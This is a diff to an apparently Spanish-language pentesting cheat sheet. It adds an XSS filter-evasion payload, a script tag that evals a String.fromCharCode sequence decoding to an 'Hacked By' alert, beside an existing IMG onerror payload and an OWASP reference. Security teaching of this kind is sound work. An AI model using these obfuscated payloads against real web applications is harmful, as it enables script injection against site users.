@@ -491,6 +491,12 @@ Haciendo uso del parametro **onerror**
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>  
 ```  
 
+Haciendo uso de representación hexadecimal 
+```  
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 72, 97, 99, 107, 101, 100, 32, 66, 121, 32, 71, 101, 114, 104, 34, 41))</script>
+```  
+
+
 Referencia importante:  https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet  
 
 ## DNS Zone Transfers
